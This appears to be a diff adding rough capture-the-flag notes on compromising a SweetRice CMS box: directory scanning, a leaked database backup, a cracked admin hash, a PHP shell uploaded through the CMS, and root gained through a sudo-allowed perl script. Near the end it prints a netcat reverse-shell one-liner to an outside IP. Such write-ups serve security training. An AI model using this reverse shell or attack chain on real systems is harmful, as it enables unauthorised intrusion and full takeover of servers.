@@ -1,0 +1,72 @@
+rustscan 2 ports open
+
+got into the cms by gobuster scan 
+
+gobuster dir -u http://10.10.16.48 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,php,html -x 100
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.16.48
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              100
+[+] Timeout:                 10s
+===============================================================
+2021/06/18 01:59:11 Starting gobuster in directory enumeration mode
+===============================================================
+/content              (Status: 301) [Size: 312] [--> http://10.10.16.48/content/]
+
+
+did again a gobuster scan on content directory find this /inc after then found mysql file and its data
+
+from there i found the username and password hash after that managed to unhash that by hashanalyzer website and the using crackstation
+
+42f749ade7f9e195bf475f37a44cafcb : Password123
+
+
+INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:
+
+
+
+found the cms directory by gobuster scan /as
+
+after that logged in into the cms by creds
+
+
+found the ads folder and in the directory and cms same so tried to add one php shell and it worked
+
+got a shell 
+
+
+after that i moved to the home directory of the itguy 
+saw there is a file backup.pl that is made by root and read that
+
+
+$ cat backup.pl
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+$ sudo -l
+Matching Defaults entries for www-data on THM-Chal:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+
+
+read the copy.sh file
+it is nothing but just a rev shell i edited that file and entered my id in place of that file
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.12.104 4242 >/tmp/f" > /etc/copy.sh
+
+and the ran the file backup.sh with sudo priv as we can run that file with sudo priv
+
+ sudo /usr/bin/perl /home/itguy/backup.pl
+ 
+ and started a listener on another terminal and got the shell
+ 
+ 
